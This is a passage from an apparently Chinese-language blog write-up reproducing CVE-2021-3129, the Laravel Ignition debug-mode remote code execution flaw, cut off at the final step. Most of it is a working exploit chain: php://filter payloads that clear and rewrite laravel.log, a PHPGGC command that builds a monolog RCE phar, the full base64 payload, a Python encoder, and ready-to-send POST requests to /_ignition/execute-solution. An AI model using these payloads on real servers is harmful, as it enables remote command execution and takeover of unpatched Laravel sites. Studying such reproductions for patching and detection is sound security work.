title="1.分析"></a>1.分析</h4><p>​    默认情况下，<code>laravel</code>的日志文件是放置在<code>storage/logs/laravel.log</code>文件下，用来储存一些PHP的错误和一些堆栈追踪的相关信息。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/11.png"></p><p>而如今我们要控制这个文件内容，将我们的payload写进log文件里，相当于将该Log文件构造成恶意的phar文件，在利用这个漏洞进行反序列化利用。</p><p>实现将log文件转变成恶意的phar文件。</p><p><strong>首先要进行的步骤就是将这个日志文件进行清空。</strong></p><p>首先我们通过观察可以发现日志文件的大概格式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[previous log entries]</span><br><span class="hljs-selector-attr">[prefix]</span><span class="hljs-selector-tag">PAYLOAD</span><span class="hljs-selector-attr">[midfix]</span><span class="hljs-selector-tag">PAYLOAD</span><span class="hljs-selector-attr">[suffix]</span><br></code></pre></td></tr></table></figure><p>看了这篇文章的师傅或许会想到使用<code>php://filter</code>中的<code>convert.base64-decode</code>过滤器的特性，直到都为不可见字符解码清空，达到将log清空的目的。</p><p><a href="http://blog.orange.tw/2018/10/">http://blog.orange.tw/2018/10/</a></p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/12.png"></p><p>进行如下尝试，可以发现使用<code>php://filter/convert.base64-decode/resource</code>可以忽略一些坏字符并且成功解码写入。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/13.png"></p><p>但是令人失望的是，这种方法并不能达到我们将log清空的目的。虽然使用PHP在对字符串进行Base64解码时会忽略任何的坏字符，但是一个字符除外<code>=</code>。如果我们使用<code>base64-decode</code>过滤器过滤一个<code>=</code>中间包含<code>a</code>的字符串，PHP将产生错误并且不返回任何内容。因此，我们想用base64-decode来进行坏字符的过滤，必须有控制整个文件的可能性，但是这是不可能的，因为我们能够往日志文件写入的数据只有一小部分，同时在日志文件中还存在比较难以解决的<strong>日期前缀</strong>以及一些<strong>堆栈跟踪的后缀</strong>。</p><p>尝试对日期前缀家进行解码。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/15.png"></p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/14.png"></p><p>根据日期的不同，对前缀进行两次解码时，会得到不同大小的结果。当我们对它进行解码时，在第二种情况下，我们的payload将以2作为前缀，从而需要改变<code>base64</code>消息的对齐方式。</p><p>因此我们无法使用<code>php://filter/convert.base64-decode/resource</code>来实现清空日志文件的操作。</p><p>但是<code>php://filter</code>提供了一个新的方式：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=consumed/</span>resource=<span class="hljs-regexp">/path/</span>to/file.txt<br></code></pre></td></tr></table></figure><p>该方法可以帮助我们把日志给清空掉。</p><p><strong>第二个步骤是：往日志文件写入payload的同时，将前缀后缀这些无用的数据给清除掉，同时保留我们的payload。</strong></p><p>幸运的是我们修改日志文件内容的主要方式：<code>php://filter</code>不仅限于<code>base64</code>操作，还可以使用它来进行字符集转换的操作，比如：<code>UTF-16 到 UTF-8</code></p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/16.png"></p><p>从上图可以发现，非常符合我们将<code>laravel.log</code>转化为<code>phar</code>文件的第二个关键步骤：留下我们的payload，将其他无用数据进行转换（最后清除），但是还是有点问题，因为我们的payload会在一次会在日志文件中出现两次，我们最后的转化后也还是出现了两次，在把其它无用数据清楚后，有可能会造成干扰，因此我们需要将第二次的payload进行删除。</p><p>参考文章作者提供了一种思路：因为<code>UTF-16</code>是基于两字节的，因此我们可以在payload最后面增加一个字节。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">echo -ne &#x27;[Some prefix ]P<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>Y<span class="hljs-symbol">\0</span>L<span class="hljs-symbol">\0</span>O<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>D<span class="hljs-symbol">\0</span>X[midfix]P<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>Y<span class="hljs-symbol">\0</span>L<span class="hljs-symbol">\0</span>O<span class="hljs-symbol">\0</span>A<span class="hljs-symbol">\0</span>D<span class="hljs-symbol">\0</span>X[Some suffix ]&#x27; &gt; /tmp/test<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/17.png"></p><p>完美的将第二个payload给去除，只留下一个。</p><p>现在我们需要的是实现将除payload以外的所有无用数据给清除掉。方法还是使用<code>base64-decode</code>!!!上面我们讨论过了，单单使用<code>base64-decode</code>并不能实现，但是可以配合<code>UTF-16 TO UTF-8</code>的字符集转换即可。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> -n TEST! | base64 | sed -E <span class="hljs-string">&#x27;s/./\0\\0/g&#x27;</span><br>V\0E\0V\0T\0V\0C\0E\0=\0<br>$ <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&#x27;[Some prefix ]V\0E\0V\0T\0V\0C\0E\0=\0X[midfix]V\0E\0V\0T\0V\0C\0E\0=\0X[Some suffix ]&#x27;</span> &gt; /tmp/<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">php &gt; <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&#x27;php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt&#x27;</span>);<br>TEST!<br></code></pre></td></tr></table></figure><p>我们还有一个问题，<code>UTF-16</code>转换字符集的时候需要两字节才不会出现问题。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/18.png"></p><p>文章作者对此的解决方法是利用NULL字符去填充payload，将其从一字节填充到两字节，但是在PHP中加载带着NULL字符的文件是会爆出错误的：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">PHP Warnin<span class="hljs-variable">g:</span>  file_get_contents() expects parameter <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> <span class="hljs-keyword">a</span> valid path, <span class="hljs-built_in">string</span> given in php <span class="hljs-keyword">shell</span> code <span class="hljs-keyword">on</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>因此是无法通过注入存在NULL字符的payload到日志文件中的，但是<code>php://filter</code>存在一种过滤器解决了这个问题：<a href="https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable">convert.quoted-printable-decode</a></p><p>我们可以将NULL字符通过使用<code>=00</code>进行编码，再用该过滤器进行解码即可。</p><p>最终使用的payload大概如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">viewFile: php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/</span>resource=<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/storage/</span>logs/laravel.log<br></code></pre></td></tr></table></figure><h4 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h4><p>清空日志：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">viewFile: php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=consumed/</span>resource=<span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/storage/</span>logs/laravel.log<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/19.png"></p><p>发送<code>AA</code>无用字符：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>163<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;AA&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/21.png"></p><p>再者，用<code>PHPGGC</code>生成一个payload。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php -d<span class="hljs-string">&#x27;phar.readonly=0&#x27;</span> .<span class="hljs-regexp">/phpggc monolog/</span>rce1 system id --phar phar -o php:<span class="hljs-regexp">//</span>output | base64<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8</span>+DQq<span class="hljs-number">9</span>AgAAAgAAABEAAAABAAAAAABmAgAATzozMjoi<br><span class="hljs-attribute">TW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5</span><br><span class="hljs-attribute">OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7Tzoy</span><br><span class="hljs-attribute">OToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047</span><br><span class="hljs-attribute">czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntp</span><br><span class="hljs-attribute">OjA7czoyOiJpZCI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5p</span><br><span class="hljs-attribute">dGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNz</span><br><span class="hljs-attribute">b3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX1zOjEzOiIAKgBi</span><br><span class="hljs-attribute">dWZmZXJTaXplIjtpOi0xO3M6OToiACoAYnVmZmVyIjthOjE6e2k6MDthOjI6e2k6MDtzOjI6Imlk</span><br><span class="hljs-attribute">IjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7</span><br><span class="hljs-attribute">YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7</span><br><span class="hljs-attribute">aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0FAAAAZHVtbXkEAAAAL7jEYAQA</span><br><span class="hljs-attribute">AAAMfn</span>/YpAEAAAAAAAAIAAAAdGVzdC<span class="hljs-number">50</span>eHQEAAAAL<span class="hljs-number">7</span>jEYAQAAAAMfn/YpAEAAAAAAAB<span class="hljs-number">0</span>ZXN<span class="hljs-number">0</span>dGVz<br><span class="hljs-attribute">dGnV77FlmdRRcxEsm</span>+<span class="hljs-number">4</span>qIqC<span class="hljs-number">01</span>E<span class="hljs-number">8</span>AAgAAAEdCTUI=<br></code></pre></td></tr></table></figure><p>我们还需要将以上的payload进行字符集的转换：</p><p>这是在网上找的脚本：其中之所以在最终payload前加上<code>AAAAAAAAAAAAAAA</code>是为了解决一个坑点，我在进行复现的时候，发现我们传入的<code>payload</code>会出现在日志文件中三次，其中第三次是不完整的会导致我在对日志文件进行字符集转换的时候出现错误，因此我们需要在payload前填充15个无用字符来避免错误。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/20.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex<br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQq9AgAAAgAAABEAAAABAAAAAABmAgAATzozMjoi</span><br><span class="hljs-string">TW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5</span><br><span class="hljs-string">OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7Tzoy</span><br><span class="hljs-string">OToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047</span><br><span class="hljs-string">czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntp</span><br><span class="hljs-string">OjA7czoyOiJpZCI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5p</span><br><span class="hljs-string">dGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNz</span><br><span class="hljs-string">b3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjY6InN5c3RlbSI7fX1zOjEzOiIAKgBi</span><br><span class="hljs-string">dWZmZXJTaXplIjtpOi0xO3M6OToiACoAYnVmZmVyIjthOjE6e2k6MDthOjI6e2k6MDtzOjI6Imlk</span><br><span class="hljs-string">IjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7</span><br><span class="hljs-string">YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7</span><br><span class="hljs-string">aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0FAAAAZHVtbXkEAAAAkYrEYAQA</span><br><span class="hljs-string">AAAMfn/YpAEAAAAAAAAIAAAAdGVzdC50eHQEAAAAkYrEYAQAAAAMfn/YpAEAAAAAAAB0ZXN0dGVz</span><br><span class="hljs-string">dFnC1rdK+he/VojBbla5FVr2USRhAgAAAEdCTUI=&#x27;&#x27;&#x27;</span> <span class="hljs-comment"># base64 payload</span><br>armedPayload = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>    i = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(i.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()<br>    armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span><br>print(<span class="hljs-string">&quot;AAAAAAAAAAAAAAA&quot;</span>+armedPayload)<span class="hljs-comment">#前面加15个字符</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6422<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;AAAAAAAAAAAAAAA=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=39=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6D=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=0A=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=0A=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=0A=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=0A=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=0A=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=79=00=4F=00=69=00=4A=00=70=00=5A=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=0A=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=0A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=0A=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=54=00=61=00=58=00=70=00=6C=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=49=00=36=00=49=00=6D=00=6C=00=6B=00=0A=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=0A=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=0A=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=6B=00=59=00=72=00=45=00=59=00=41=00=51=00=41=00=0A=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=6B=00=59=00=72=00=45=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=64=00=47=00=56=00=7A=00=0A=00=64=00=46=00=6E=00=43=00=31=00=72=00=64=00=4B=00=2B=00=68=00=65=00=2F=00=56=00=6F=00=6A=00=42=00=62=00=6C=00=61=00=35=00=46=00=56=00=72=00=32=00=55=00=53=00=52=00=68=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/22.png"></p><p>将日志文件转化成phar文件。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>326<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/www/wwwroot/127.0.0.1/laravel/storage/logs/laravel.log&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/23.png"></p><p>最后利用<code>phar</code>反序列化日志文件（转化之后的）</p><figure class="highlight"><table><tr><td 